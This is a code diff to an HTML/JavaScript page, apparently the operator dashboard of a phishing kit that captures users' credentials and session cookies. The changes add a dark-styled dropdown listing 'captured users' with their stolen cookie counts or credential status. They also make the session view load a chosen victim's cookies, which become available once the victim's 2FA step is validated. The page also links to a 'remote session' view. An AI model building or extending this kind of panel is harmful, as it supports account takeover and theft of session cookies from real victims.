@@ -9,6 +9,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     :root {
+      color-scheme: dark;
       --bg: #09090b;
       --card-bg: #121217;
       --card-hover: #18181f;
@@ -24,6 +25,45 @@
       --accent-purple-subtle: rgba(99, 102, 241, 0.15);
       --danger: #ef4444;
       --danger-subtle: rgba(239, 68, 68, 0.15);
+    }
+
+    /* Modern Dark Selects */
+    .select-group {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #0d0d11;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 8px;
+      padding: 2px 10px;
+      transition: border-color .15s ease;
+    }
+    .select-group:focus-within {
+      border-color: rgba(2, 215, 47, 0.5);
+    }
+    .control-select {
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 600;
+      outline: none;
+      cursor: pointer;
+      font-family: inherit;
+      padding: 6px 26px 6px 4px;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a1a1aa' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 6px center;
+      background-size: 11px;
+    }
+    .control-select option {
+      background-color: #121217;
+      color: #f4f4f5;
+      padding: 8px 12px;
+      font-size: 12px;
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -445,6 +485,13 @@
     </div>
 
     <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+      <div class="select-group" title="Selecione o Usuário Capturado">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        <select id="seletor-usuario-sessao" class="control-select">
+          <option value="">Aguardando seleção de usuário...</option>
+        </select>
+      </div>
+
       <div class="live-badge" id="session-tenant-badge" style="background: rgba(99, 102, 241, 0.15); border-color: rgba(99, 102, 241, 0.35); color: #818cf8;">
         <span>Tenant: default</span>
       </div>
@@ -616,6 +663,7 @@
     }
 
     const urlParams = new URLSearchParams(window.location.search);
+    const urlParts = window.location.pathname.split("/").filter(Boolean);
     let rawUsuario = urlParts[urlParts.length - 1] || "";
     if (rawUsuario === "sessao" || rawUsuario === "acesso" || rawUsuario === "sessaoremota") {
       rawUsuario = urlParams.get("usuario") || "";
@@ -640,6 +688,7 @@
     const tbodyCookies = document.getElementById("tbody-cookies");
     const totalLinhasCookies = document.getElementById("total-linhas-cookies");
     const sessionTenantBadge = document.getElementById("session-tenant-badge");
+    const seletorUsuarioSessao = document.getElementById("seletor-usuario-sessao");
     const linkVoltarPainel = document.getElementById("link-voltar-painel");
     const btnAbrirRemota = document.getElementById("btn-abrir-remota");
     const toast = document.getElementById("toast");
@@ -653,6 +702,40 @@
     }
     if (btnAbrirRemota) {
       btnAbrirRemota.href = `/sessaoremota.html?usuario=${encodeURIComponent(usuarioParam || '')}${tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+    }
+
+    async function carregarSeletorUsuariosSessao() {
+      if (!seletorUsuarioSessao) return;
+      try {
+        const query = `/api/usuarios?t=${Date.now()}${tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+        const res = await fetch(query);
+        const json = await res.json();
+        if (json.success && Array.isArray(json.usuarios)) {
+          let html = `<option value="">Aguardando seleção de usuário...</option>`;
+          json.usuarios.forEach(u => {
+            const isSel = (usuarioParam && u.usuario.toLowerCase() === usuarioParam.toLowerCase()) ? "selected" : "";
+            const statusTxt = u.tem_sessao_salva ? `${u.total_cookies || 0} cookies` : (u.status || u.status_credencial || "capturado");
+            html += `<option value="${escapeHtml(u.usuario)}" ${isSel}>${escapeHtml(u.usuario)} [${escapeHtml(statusTxt)}]</option>`;
+          });
+          seletorUsuarioSessao.innerHTML = html;
+          if (usuarioParam) {
+            seletorUsuarioSessao.value = usuarioParam;
+          }
+        }
+      } catch (e) {
+        console.error("Erro ao carregar lista de usuários:", e);
+      }
+    }
+
+    if (seletorUsuarioSessao) {
+      seletorUsuarioSessao.addEventListener("change", () => {
+        const u = seletorUsuarioSessao.value.trim();
+        if (u) {
+          window.location.href = `/sessao/${encodeURIComponent(u)}${tenantParam ? `?tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+        } else {
+          window.location.href = `/sessao${tenantParam ? `?tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+        }
+      });
     }
 
     function showToast(msg) {
@@ -678,17 +761,24 @@
     }
 
     async function carregarSessao() {
+      if (!usuarioParam) {
+        subUsuario.textContent = "Aguardando seleção de um usuário capturado acima...";
+        kpiUsuario.textContent = "—";
+        kpiData.textContent = "—";
+        kpiCookies.textContent = "0";
+        tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--text-muted);">Nenhum usuário selecionado. Escolha um usuário capturado no seletor acima para visualizar seus cookies.</td></tr>`;
+        totalLinhasCookies.textContent = "0 itens";
+        return;
+      }
       try {
         const queryTenant = tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : '';
-        const apiUrl = usuarioParam
-          ? `/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}${queryTenant}`
-          : `/api/sessao?t=${Date.now()}${queryTenant}`;
+        const apiUrl = `/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}${queryTenant}`;
         const res = await fetch(apiUrl);
         if (!res.ok) throw new Error("Sessão não localizada");
         const data = await res.json();
         sessaoData = data;
 
-        const u = data.usuario || usuarioParam || "Operador";
+        const u = data.usuario || usuarioParam;
         const t = data.tenant || tenantParam || "default";
         if (sessionTenantBadge) {
           sessionTenantBadge.innerHTML = `<span>Tenant: ${t}</span>`;
@@ -710,7 +800,7 @@
 
       } catch (err) {
         console.error("Erro ao carregar sessão:", err);
-        subUsuario.textContent = usuarioParam ? `Sessão não encontrada para: ${usuarioParam}` : "Nenhuma sessão de cookies localizada no servidor.";
+        subUsuario.textContent = `Sessão não encontrada para: ${usuarioParam}`;
         tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--danger);">Sessão de cookies ainda não foi finalizada para este usuário. Aguarde a validação do 2FA.</td></tr>`;
       }
     }
@@ -820,6 +910,7 @@
       window.location.href = url;
     });
 
+    carregarSeletorUsuariosSessao();
     carregarSessao();
   </script>
 </body>
